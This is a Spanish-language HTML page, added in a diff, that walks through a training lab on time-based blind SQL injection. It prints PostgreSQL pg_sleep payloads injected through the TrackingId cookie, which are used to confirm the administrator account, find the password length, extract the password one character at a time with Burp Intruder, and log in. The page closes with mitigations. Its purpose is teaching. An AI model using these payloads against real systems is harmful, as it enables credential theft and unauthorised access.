@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Laboratorio 15 | Blind SQL injection with time delays and information retrieval</title>
+    <link rel="stylesheet" href="estilos.css">
+    <style>
+
+    </style>
+</head>
+
+<body>
+    <nav class="nav">
+        <a href="index.html">← Volver al Inicio</a>
+    </nav>
+
+    <div class="page-wrapper">
+        <article class="white-paper">
+
+            <h1>Blind SQL injection with time delays and information retrieval</h1>
+
+            <h2>Nombre del laboratorio</h2>
+            <p>Inyección SQL ciega con retrasos de tiempo y recuperación de información.</p>
+
+            <h2>Tipo de SQLi</h2>
+            <p>Inferential SQLi (Time-based) avanzada.</p>
+
+            <h2>Objetivo del laboratorio</h2>
+            <p>
+                Determinar la longitud de la contraseña del usuario <code>administrator</code>.<br>
+                Extraer cada carácter de dicha contraseña mediante ataques de fuerza bruta basados en tiempo.<br>
+                Iniciar sesión en la cuenta del administrador para resolver el laboratorio.
+            </p>
+
+            <h2>Explicación técnica</h2>
+            <p>
+                El atacante utiliza consultas condicionales que ejecutan un retraso si una suposición sobre los datos es
+                verdadera.<br>
+                <strong>Preguntas Sí/No:</strong> Si la condición es cierta, la consulta espera 10 segundos.<br>
+                <strong>Observación del Cronómetro:</strong> Respuesta rápida = falso, retraso = verdadero.<br>
+                <strong>Repetición Exhaustiva:</strong> Se prueba cada posición y carácter posible.<br>
+                <strong>Sincronía:</strong> El retraso en la base de datos se refleja en la respuesta HTTP.
+            </p>
+
+            <h2>Procedimiento paso a paso</h2>
+
+            <h3>Captura inicial</h3>
+            <p>
+                Acceder al laboratorio con BurpSuite y localizar la cookie <code>TrackingId</code> en HTTP History.
+            </p>
+            <a href="lab15_img1">Imagen 1</a>
+
+            <h3>Prueba de condición verdadera</h3>
+            <p>
+                Payload: <code>TrackingId=x'%3BSELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END--</code>.
+                La solicitud tarda 10 segundos en responder.
+            </p>
+            <a href="lab15_img2">Imagen 2</a>
+
+            <h3>Prueba de condición falsa</h3>
+            <p>
+                Payload: <code>TrackingId=x'%3BSELECT CASE WHEN (1=2) THEN pg_sleep(10) ELSE pg_sleep(0) END--</code>.
+                La respuesta es inmediata.
+            </p>
+            <a href="lab15_img3">Imagen 3</a>
+
+            <h3>Confirmación de usuario administrator</h3>
+            <p>
+                Payload:
+                <code>TrackingId=x'%3BSELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</code>.
+                La solicitud tarda 10 segundos, confirmando la existencia del usuario.
+            </p>
+            <a href="lab15_img4">Imagen 4</a>
+
+            <h3>Determinación de longitud de contraseña</h3>
+            <p>
+                Payload:
+                <code>TrackingId=x'%3BSELECT CASE WHEN (username='administrator' AND LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</code>.
+                La respuesta tarda 10 segundos, confirmando que la contraseña tiene más de un carácter.
+            </p>
+            <a href="lab15_img5">Imagen 5</a>
+
+            <h3>Confirmación de longitud exacta</h3>
+            <p>
+                Probar con valores crecientes (>2, >3, etc.).
+                Se determina que la contraseña tiene 20 caracteres.
+            </p>
+            <a href="lab15_img6">Imagen 6</a>
+
+            <h3>Extracción de caracteres</h3>
+            <p>
+                Payload:
+                <code>TrackingId=x'%3BSELECT CASE WHEN (username='administrator' AND SUBSTRING(password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</code>.
+                Se usa Burp Intruder para automatizar pruebas carácter por carácter.
+            </p>
+            <a href="lab15_img7">Imagen 7</a>
+
+            <h3>Configuración de Intruder</h3>
+            <p>
+                Configurar payloads alfanuméricos y limitar a un solo subproceso para medir tiempos de respuesta con
+                precisión.
+            </p>
+            <a href="lab15_img8">Imagen 8</a>
+
+            <h3>Resultados del ataque</h3>
+            <p>
+                Revisar la columna "Response received".
+                El carácter correcto tarda ~10 000 ms en responder.
+            </p>
+            <a href="lab15_img9">Imagen 9</a>
+
+            <h3>Repetición para cada posición</h3>
+            <p>
+                Repetir el ataque para posiciones 2, 3, 4... hasta 20.
+                Se reconstruye la contraseña completa.
+            </p>
+            <a href="lab15_img10">Imagen 10</a>
+
+            <h3>Inicio de sesión</h3>
+            <p>
+                Usar las credenciales obtenidas para acceder como <code>administrator</code> y resolver el laboratorio.
+            </p>
+            <a href="lab15_img11">Imagen 11</a>
+
+            <h2>Mitigaciones recomendadas</h2>
+            <p>
+                <strong>Consultas Parametrizadas:</strong> Evitar ejecución de funciones inyectadas.<br>
+                <strong>Uso de ORMs Seguros:</strong> Automatizar limpieza de datos.<br>
+                <strong>Detección de Anomalías (WAF/IDS):</strong> Bloquear múltiples peticiones sospechosas.<br>
+                <strong>Rate Limiting:</strong> Restringir número de solicitudes por segundo.<br>
+                <strong>Privilegios Mínimos:</strong> Evitar permisos para funciones de tiempo en la base de datos.
+            </p>
+
+
+
+
+
+
+
+
+            <div class="download-container">
+                <a href="RTHF.pdf" download="Laboratorios_RTHF_completos.pdf" class="btn-download">
+                    📥 Descargar Versión Completa (PDF/HTML)
+                </a>
+            </div>
+
+            <section id="comentarios-seccion">
+                <h3 style="color: #111827;">Comentarios Técnicos</h3>
+                <div id="display-comments"></div>
+                <form id="comment-form">
+                    <textarea id="user-comment" placeholder="Escribe tu opinión técnica sobre este ataque..."
+                        required></textarea>
+                    <button type="submit" id="button">Publicar Comentario</button>
+                </form>
+            </section>
+        </article>
+    </div>
+
+    <script src="comentarios.js"></script>
+</body>
+
+</html>
